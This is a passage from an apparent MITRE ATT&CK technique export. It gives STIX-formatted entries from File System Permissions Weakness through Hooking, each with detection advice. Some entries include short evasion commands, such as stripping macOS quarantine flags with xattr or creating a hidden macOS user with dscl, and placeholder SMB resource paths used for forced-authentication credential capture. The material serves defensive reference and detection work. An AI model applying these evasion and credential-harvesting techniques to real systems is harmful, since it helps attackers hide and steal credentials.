Permissions Required: Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1006', 'external_id': 'T1006'}, {'source_name': 'Hakobyan 2009', 'description': 'Hakobyan, A. (2009, January 8). FDump - Dumping File Sectors Directly from Disk using Logical Offsets. Retrieved November 12, 2014.', 'url': 'http://www.codeproject.com/Articles/32169/FDump-Dumping-File-Sectors-Directly-from-Disk-usin'}, {'source_name': 'Github PowerSploit Ninjacopy', 'description': 'Bialek, J. (2015, December 16). Invoke-NinjaCopy.ps1. Retrieved June 2, 2016.', 'url': 'https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring']","['Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['File monitoring', 'File system access controls']"
"attack-pattern","attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a","2017-05-31T21:30:43.063Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","File System Permissions Weakness","Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

===Services===

Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.

===Executable Installers===

Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the `%TEMP%` directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)

Detection: Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.

Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.

Platforms: Windows

Data Sources: File monitoring, Process command-line parameters, Services

Effective Permissions: User, Administrator, SYSTEM

Permissions Required: User, Administrator

Contributors: Stefan Kanthak, Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1044', 'external_id': 'T1044'}, {'source_name': 'Mozilla Firefox Installer DLL Hijack', 'description': 'Kugler, R. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017.', 'url': 'https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/'}, {'source_name': 'Seclists Kanthak 7zip Installer', 'description': 'Kanthak, S. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe\tallows remote code execution with escalation of privilege. Retrieved March 10, 2017.', 'url': 'http://seclists.org/fulldisclosure/2015/Dec/34'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process command-line parameters', 'Services']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Stefan Kanthak', 'Travis Smith, Tripwire']","['User', 'Administrator', 'SYSTEM']","","","",""
"attack-pattern","attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18","2017-05-31T21:31:04.710Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","File and Directory Discovery","Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. 

===Windows===

Example utilities used to obtain this information are `dir` and `tree`. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.

===Mac and Linux===

In Mac and Linux, this kind of discovery is accomplished with the `ls`, `find`, and `locate` commands.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process command-line parameters, Process monitoring

Permissions Required: User, Administrator, SYSTEM

System Requirements: Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1083', 'external_id': 'T1083'}, {'source_name': 'Windows Commands JPCERT', 'description': 'Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.', 'url': 'http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process command-line parameters', 'Process monitoring']","['User', 'Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","","",""
"attack-pattern","attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Forced Authentication","The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.  (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. Web Distributed Authoring and Versioning (WebDAV) is typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)

Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary, or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information including the user's hashed credentials over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials, or reuse it for Pass the Hash. (Citation: Cylance Redirect to SMB)

There are different ways this can occur:
*A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened. The document can include, for example, a request similar to `file[:]//[remote address]/Normal.dotm` to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)
*A modified .LNK or .SCF file with the icon filename pointing to an external reference such as `\\[remote address]\pic.png` that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)

Detection: Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause.

Monitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)

Platforms: Windows

Data Sources: File monitoring, Network protocol analysis, Network device logs, Process use of network

Permissions Required: User

Contributors: Teodor Cimpoesu","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1187', 'external_id': 'T1187'}, {'source_name': 'Wikipedia Server Message Block', 'description': 'Wikipedia. (2017, December 16). Server Message Block. Retrieved December 21, 2017.', 'url': 'https://en.wikipedia.org/wiki/Server%20Message%20Block'}, {'source_name': 'Didier Stevens WebDAV Traffic', 'description': 'Stevens, D. (2017, November 13). WebDAV Traffic To Malicious Sites. Retrieved December 21, 2017.', 'url': 'https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/'}, {'source_name': 'Microsoft Managing WebDAV Security', 'description': 'Microsoft. (n.d.). Managing WebDAV Security (IIS 6.0). Retrieved December 21, 2017.', 'url': 'https://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx'}, {'source_name': 'GitHub Hashjacking', 'description': 'Dunning, J. (2016, August 1). Hashjacking. Retrieved December 21, 2017.', 'url': 'https://github.com/hob0/hashjacking'}, {'source_name': 'Cylance Redirect to SMB', 'description': 'Cylance. (2015, April 13). Redirect to SMB. Retrieved December 21, 2017.', 'url': 'https://www.cylance.com/content/dam/cylance/pdfs/white%20papers/RedirectToSMB.pdf'}, {'source_name': 'US-CERT APT Energy Oct 2017', 'description': 'US-CERT. (2017, October 20). Alert (TA17-293A): Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors. Retrieved November 2, 2017.', 'url': 'https://www.us-cert.gov/ncas/alerts/TA17-293A'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Network protocol analysis', 'Network device logs', 'Process use of network']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Teodor Cimpoesu']","","","","",""
"attack-pattern","attack-pattern--6fb6408c-0db3-41d9-a3a1-a32e5f16454e","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Gatekeeper Bypass","In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called `com.apple.quarantine`. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. 

Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, other utilities or events like drive-by downloads don’t necessarily set it either. This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command `xattr /path/to/MyApp.app` for `com.apple.quarantine`. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, `sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app`. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X)
 
In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)

Detection: Monitoring for the removal of the `com.apple.quarantine` flag by a user instead of the operating system is a suspicious action and should be examined further.

Platforms: macOS

Defense Bypassed: Application whitelisting, Anti-virus

Permissions Required: User, Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1144', 'external_id': 'T1144'}, {'source_name': 'Methods of Mac Malware Persistence', 'description': 'Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.', 'url': 'https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf'}, {'source_name': 'Clearing quarantine attribute', 'description': 'Rich Trouton. (2012, November 20). Clearing the quarantine extended attribute from downloaded applications. Retrieved July 5, 2017.', 'url': 'https://derflounder.wordpress.com/2012/11/20/clearing-the-quarantine-extended-attribute-from-downloaded-applications/'}, {'source_name': 'OceanLotus for OS X', 'description': 'Eddie Lee. (2016, February 17). OceanLotus for OS X - an Application Bundle Pretending to be an Adobe Flash Update. Retrieved July 5, 2017.', 'url': 'https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update'}, {'source_name': 'Bypassing Gatekeeper', 'description': ""Thomas Reed. (2016, March 31). Bypassing Apple's Gatekeeper. Retrieved July 5, 2017."", 'url': 'https://blog.malwarebytes.com/cybercrime/2015/10/bypassing-apples-gatekeeper/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","","['User', 'Administrator']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Application whitelisting', 'Anti-virus']"
"attack-pattern","attack-pattern--a6525aec-acc4-47fe-92f9-b9b4de4b9228","2017-05-31T21:30:50.342Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Graphical User Interface","Cause a binary or script to execute based on interacting with the file through a graphical user interface (GUI) or in an interactive remote session such as Remote Desktop Protocol.

Detection: Detection of execution through the GUI will likely lead to significant false positives. Other factors should be considered to detect misuse of services that can lead to adversaries gaining access to systems through interactive remote sessions. 

Unknown or unusual process launches outside of normal behavior on a particular system occurring through remote interactive sessions are suspicious. Collect and audit security logs that may indicate access to and use of Legitimate Credentials to access remote systems within the network.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Binary file metadata, Process command-line parameters, Process monitoring

Permissions Required: User, Administrator, SYSTEM

Remote Support: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1061', 'external_id': 'T1061'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['User', 'Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","True","",""
"attack-pattern","attack-pattern--086952c4-5b90-4185-b573-02bad8e11953","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","HISTCONTROL","The `HISTCONTROL` environment variable keeps track of what should be saved by the `history` command and eventually into the `~/.bash_history` file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". `HISTCONTROL` can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. `HISTCONTROL` does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.

Detection: Correlating a user session with a distinct lack of new commands in their `.bash_history` can be a clue to suspicious behavior. Additionally, users checking or changing their `HISTCONTROL` environment variable is also suspicious.

Platforms: Linux, macOS

Data Sources: Process Monitoring, Authentication logs, File monitoring, Environment variable

Defense Bypassed: Log analysis, Host forensic analysis

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1148', 'external_id': 'T1148'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process Monitoring', 'Authentication logs', 'File monitoring', 'Environment variable']","['User']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Log analysis', 'Host forensic analysis']"
"attack-pattern","attack-pattern--dc27c2ec-c5f9-4228-ba57-d67b590bda93","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Hidden Files and Directories","To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (`dir /a` for Windows and `ls –a` for Linux and macOS).

===Windows===

Users can mark specific files as hidden by using the attrib.exe binary. Simply do `attrib +h filename` to mark a file or folder as hidden. Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”.

===Linux/Mac===

Users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: `defaults write com.apple.finder AppleShowAllFiles YES`, and then relaunch the Finder Application.

===Mac===

Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).
Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys. 

Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.

Detection: Monitor the file system and shell commands for files being created with a leading ""."" and the Windows command-line use of attrib.exe to add the hidden attribute.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process Monitoring, Process command-line parameters

Defense Bypassed: Host forensic analysis

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1158', 'external_id': 'T1158'}, {'source_name': 'Sofacy Komplex Trojan', 'description': ""Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017."", 'url': 'https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/'}, {'source_name': 'Antiquated Mac Malware', 'description': 'Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.', 'url': 'https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/'}, {'source_name': 'WireLurker', 'description': 'Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.', 'url': 'https://www.paloaltonetworks.com/content/dam/pan/en%20US/assets/pdf/reports/Unit%2042/unit42-wirelurker.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring', 'Process command-line parameters']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Host forensic analysis']"
"attack-pattern","attack-pattern--ce73ea43-8e77-47ba-9c11-5e9c9c58b9ff","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Hidden Users","Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in `/Library/Preferences/com.apple.loginwindow` called `Hide500Users` that prevents users with userIDs 500 and lower from appearing at the login screen. By using the Create Account technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: `sudo dscl . -create /Users/username UniqueID 401` (Citation: Cybereason OSX Pirrit).

Detection: This technique prevents the new user from showing up at the log in screen, but all of the other signs of a new user still exist. The user still gets a home directory and will appear in the authentication logs.

Platforms: macOS

Data Sources: Authentication logs, File monitoring

Permissions Required: Administrator, root","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1147', 'external_id': 'T1147'}, {'source_name': 'Cybereason OSX Pirrit', 'description': 'Amit Serper. (2016). Cybereason Lab Analysis OSX.Pirrit. Retrieved July 8, 2017.', 'url': 'https://www2.cybereason.com/research-osx-pirrit-mac-os-x-secuirty'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs', 'File monitoring']","['Administrator', 'root']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Hidden Window","The configurations for how applications run on macOS and OS X are listed in property list (plist) files. One of the tags in these files can be `apple.awt.UIElement`, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window  (Citation: Antiquated Mac Malware).

Detection: Plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the `apple.awt.UIElement` or any other suspicious plist tag in plist files and flag them.

Platforms: macOS

Data Sources: File monitoring

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1143', 'external_id': 'T1143'}, {'source_name': 'Antiquated Mac Malware', 'description': 'Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.', 'url': 'https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring']","['User']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--66f73398-8394-4711-85e5-34c8540b22a5","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Hooking","Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. Hooking involves redirecting calls to these functions and can be implemented via:
* '''Hooks procedures''', which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Engame Process Injection July 2017)
* '''Import address table (IAT) hooking''', which use modifications to a process’s IAT, where pointers to imported API functions are stored. (Citation: Engame Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)
* '''Inline hooking''', which overwrites the first bytes in an API function to redirect code flow. (Citation: Engame Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)

Similar to Process Injection, adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.

Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)

Hooking is commonly utilized by Rootkits to conceal files,
processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)

Detection: Monitor for calls to the SetWindowsHookEx and SetWinEventHook functions, which install a hook procedure. (Citation: Microsoft Hook Overview) (Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools  (Citation: Volatility Detecting Hooks Sept 2012) (Citation: PreKageo Winhook Jul 2011) (Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures. (Citation: Zairon Hooking Dec 2006) (Citation: EyeofRa Detecting Hooking June 2017)

Rootkits detectors  (Citation: GMER Rootkits) can also be used to monitor for various flavors of hooking activity.

Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes  (Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions. (Citation: StackExchange Hooks Jul 2012) (Citation: Adlice Software IAT Hooks Oct 2014)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.

Platforms: Windows

Data Sources: API monitoring, Binary file metadata, DLL monitoring, Loaded DLLs, Process Monitoring, Windows event logs

Permissions Required: Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1179', 'external_id': 'T1179'}, {'source_name': 'Microsoft Hook Overview', 'description': 'Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx'}, {'source_name': 'Engame Process Injection July 2017', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process'}, {'source_name': 'Adlice Software IAT Hooks Oct 2014', 'description': 'Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks. Retrieved December 12, 2017.', 'url': 'https://www.adlice.com/userland-rootkits-part-1-iat-hooks/'}, {'source_name': 'MWRInfoSecurity Dynamic Hooking 2015', 'description': 'Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User Mode. Retrieved December 20, 2017.', 'url': 'https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/'}, {'source_name': 'HighTech Bridge Inline Hooking Sept 2011', 'description': 'Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved December 12, 2017.', 'url': 'https://www.exploit-db.com/docs/17802.pdf'}, {'source_name': 'Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017', 'description': 'Microsoft. (2017, September 15). TrojanSpy:Win32/Ursnif.gen!I. Retrieved December 18, 2017.'}, {'source_name': 'Symantec Windows Rootkits', 'description': 'Symantec. (n.d.). Windows Rootkit Overview. Retrieved December 21, 2017.', 'url': 'https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf'}, {'source_name': 'Volatility Detecting Hooks Sept 2012', 'description': 'Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.', 'url': 'https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html'}, {'source_name': 'PreKageo Winhook Jul 2011', 'description': 'Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.', 'url': 'https://github.com/prekageo/winhook'}, {'source_name': 'Jay GetHooks Sept 2011', 'description': 'Satiro, J. (2011, September 14). GetHooks. Retrieved December 12, 2017.', 'url': 'https://github.com/jay/gethooks'}, {'source_name': 'Zairon Hooking Dec 2006', 'description': 'Felici, M. (2006, December 6). Any application-defined hook procedure on my machine?. Retrieved December 12, 2017.', 'url': 'https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/'}, {'source_name': 'EyeofRa Detecting Hooking June 2017', 'description': 'Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense against user-land. Retrieved December 12, 2017.', 'url': 'https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/'}, {'source_name': 'GMER Rootkits', 'description': 'GMER. (n.d.). GMER. Retrieved December 12, 2017.', 'url': 'http://www.gmer.net/'}, {'source_name': 'Microsoft Process Snapshot', 'description': 'Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved December 12, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx'}, {'source_name': 'StackExchange Hooks Jul 2012', 'description': 'Stack Exchange - Security. (2012, July 31). What are the methods to find hooked functions and APIs?. Retrieved December 12, 2017.', 'url': 'https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Binary file metadata', 'DLL monitoring', 'Loaded DLLs', 'Process Monitoring', 'Windows event logs']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
